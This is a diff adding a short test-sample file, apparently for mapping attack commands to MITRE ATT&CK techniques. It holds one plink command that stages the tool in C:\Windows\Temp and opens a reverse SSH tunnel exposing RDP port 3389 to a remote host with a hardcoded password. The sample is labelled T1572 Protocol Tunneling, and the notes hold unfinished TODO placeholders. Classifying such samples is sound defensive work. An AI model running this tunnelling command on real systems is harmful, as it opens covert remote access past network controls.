@@ -1,0 +1,11 @@
+[Test-sample]:
+Move-Item plink.exe C:\Windows\Temp\plink.exe;
+echo n | C:\Windows\Temp\plink.exe -pw "azsxdcAZSXDC123" alfred@192.168.0.4 -R 3389:localhost:3389
+
+[Observed-Techniques]:
+*TODO: Manually it was hard to find set of techniques where T1572 is in Top-20 of the predicted techniuqes of MITRE-TIE. 
+       So might need to figure out ones MITRE-TIE in python notebook or source-code
+
+[Notes]:
+T1572: Protocol Tunneling ( 5/5 confidence )  :  
+MITRE-TIE TOP #<X> with { <TODO> } from CTI-frequency-dataset  [ id: <N> ] 
